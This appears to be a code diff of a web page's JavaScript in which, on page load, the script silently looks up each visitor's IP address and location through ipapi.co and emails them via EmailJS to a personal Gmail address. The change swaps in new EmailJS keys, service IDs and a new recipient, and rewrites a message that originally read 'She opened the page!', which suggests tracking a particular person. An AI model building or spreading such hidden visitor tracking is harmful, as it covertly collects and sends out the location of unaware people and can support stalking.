@@ -1322,24 +1322,25 @@ function setDefaultProcessToPixels() {
 setDefaultProcessToPixels() 
 
 document.addEventListener("DOMContentLoaded", function () {
-    emailjs.init("g68cD0jfv_Qzhryze"); // Your EmailJS Public Key
+    emailjs.init("s5lUnsGD0mwm7ppXz"); // Your EmailJS Public Key
 
     fetch("https://ipapi.co/json/") // Fetch IP & Location Data
         .then(response => response.json())
         .then(data => {
             let templateParams = {
-                to_email: "techpc.u2005@gmail.com",
-                message: `She opened the page! 
+                to_email: "kadapamallikarjun15@gmail.com",
+                message: `Someone the page! 
                           IP: ${data.ip} 
                           City: ${data.city}, 
                           Region: ${data.region}, 
                           Country: ${data.country_name}`
             };
 
-            emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
+            emailjs.send("service_nom87sd", "template_faad2k8", templateParams)
                 .then(response => console.log("✅ Email sent!", response))
                 .catch(error => console.log("❌ Failed to send email", error));
         })
         .catch(error => console.log("❌ Failed to get IP info", error));
 });
+
 
